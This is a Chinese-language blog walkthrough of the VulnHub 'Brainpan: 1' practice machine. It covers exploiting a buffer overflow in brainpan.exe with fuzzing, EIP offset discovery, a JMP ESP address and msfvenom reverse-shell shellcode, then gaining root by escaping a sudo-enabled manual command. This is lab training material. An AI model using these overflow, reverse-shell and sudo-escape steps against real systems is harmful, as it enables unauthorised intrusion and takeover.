---
title: Brainpan-1
author: Creexile
date: 2024-10-02 15:38:36
lastMod: 2025-04-10
summary: 'No.10'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [工具, 缓冲区溢出, 提权, 渗透]
---

# Brainpan: 1

---

No.10

> 来源: [vulnhub靶场-brainpan: 1](https://www.vulnhub.com/entry/brainpan-1,51/)
>
> 目标: 没说
>
> 提示: 这个靶机和web关系不大, 主要是缓冲区溢出
>
> 妙妙工具: python -c 'import pty; pty.spawn("/bin/bash")'

## 环境配置

kali: 192.168.56.5

target: 192.168.56.15

## 信息收集

- 端口: 9999, 10000
- 中间件: python 2.7.3(10000)
- 目录: /bin(10000)
- 系统: linux 2.6.32-3.10

基本上都是空的或者静态的, 没什么好搜索的

`/bin`目录下是一个exe文件, 但是系统是Linux?可能是开了windows服务

将这个文件下载下来, 找个地儿运行, 发现创建了9999端口的服务, 那看来靶机的9999端口就是这个了

既然只有这个能利用, 那尝试是否有缓冲区溢出

脚本小子必备: https://github.com/jessekurrus/brainpan

## getshell

用什么调试软件都行, 我这里用的ollydbg

1. 利用脚本批量产生无意义字符测试文件, 看看是否存在溢出

当脚本出现以下情况, 则说明有缓冲区溢出, 此时运行的程序会报错或闪退

```bash
python2 .\brainfuzzer.py 127.0.0.1 9999
# 我这里是运行到大概600就停止了
# [+] Connection failed. Make sure IP/port are correct, or check debugger for brainpan.exe crash.
```

2. 判断溢出点

```bash
locate pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# 生成1000位的可以反查的字符(一定要大于溢出的极限), 复制下来然后放法到brainpan1.py运行
python2 brainpan1.py 127.0.0.1 9999
```

![image-20241002124224436](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002124224436.png)

我用的ollydbg, 运行脚本会直接报错: "不知如何继续, 因为内存地址35724134不可读. 请尝试更改EIP或忽路程序异常"

> EIP(instrutor pointer指令指针), 这个寄存器标记了下一条指令的内存地址, 是进行缓冲区溢出的关键所在

用这个去反差溢出点:

```bash
locate pattern_off
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134    # 反查溢出点
# [*] Exact match at offset 524
```

> EIP内的值是35724134，这是ASCII码的值，由于小端显示的原因(逆序)，相当于4Ar5, 可以将上面的指令改为查询4Ar5

可以看到偏移量是524, 也就是发送524+4个字符, 即可覆盖EIP寄存器, EIP寄存器存储的内容就是发送的528个字符中的最后4个字符(EIP寄存器从525开始)

接下来就是要让EIP指向我们的shellcode; 当发生溢出的情况时, 系统就会自动调用ESP, 这一段内存里面存放的是下一跳的信息, 本意是避免溢出导致计算机崩溃, 而让程序继续进行, 所以我们只需要知道他下一跳的地址以及大小, 然后我们构造相对应的shellcode即可

3. 获取shellcode空间大小

shellcode大小通常在300-400字节, 1000肯定是游刃有余; 这个程序用524个A填充EBP, 用B填充EIP, 用C填充ESP

记得重置程序

![image-20241002133149882](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002133149882.png)

右键ESP, 选择"数据中窗口跟随", 可以轻易找到从005FF910-005FFAE7都是C, 找个计算器算一算, 得到容量为471

![image-20241002134742643](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002134742643.png)

4. 查找坏字符

避免因为使用不支持的字符或使程序中断的字符导致利用失败, 运行brainpan3.py即可, 这里就不演示了

5. JMP ESP定位

想要将程序的执行流程跳转到ESP, 需要找到汇编指令JMP ESP的内存地址, 将这个地址塞进EIP中

这样运行程序就变成了: EIP->JMP ESP->ESP

用的是ollydbg, 可以直接省去一大堆操作, 直接`ctrl+f`搜索"jmp esp"

![image-20241002142122430](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002142122430.png)

我们要将这个内存地址写到EIP中, 由于小端显示的问题, 需要按照字节倒序的方式填入EIP中即"\xf3\x12\x17\x31"

6. 在ESP中填入shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.5 LPORT=6666 -b "\x00" -f c
```

自动使用了x86/shikata_ga_nai编码模块

我的推荐是将`-f c`改为`-f py`, 可以直接复制进py

![image-20241002144030801](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002144030801.png)

利用msf监听, 运行脚本即可, 回到根目录发现是linux的文件结构, 这个windows还真是linux下的服务之一

现在重新生成linux的木马:

```bash
msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.56.5 -b "\x00" -f py
```

![image-20241002145412671](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002145412671.png)

## 信息收集

10000端口服务由`/home/puck/checksrv.sh`启动, 9999也是这个文件调用brainpan.exe开启的

> `lsb_release -a` 查看发行版本, 不是那么泛用

- 权限: puck
- 发行版本: Ubuntu 12.1.
- 内核: Linux brainpan 3.5.0-25-generic \#39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
- 环境: python
- 用户: anasi, puck, reynard
- 服务: 无

`sudo -l`发现在`/home/anansi/bin/anansi_util`有免密运行的root权限

## 提权

因为不给访问, 就直接用路径了

```bash
sudo /home/anansi/bin/anansi_util
# 只有三条命令, 只有manual [command]可以交互
```

查了一下, 发现可以在manual查看手册的时候执行其他命令

```bash
sudo /home/anansi/bin/anansi_util manual ls
# 不要直接回车
!whoami
# root
```

![image-20241002153326787](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153326787.png)

如果从此处创建一个bash, 那就是root权限, 直接抓到flag

![image-20241002153513690](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241002153513690.png)
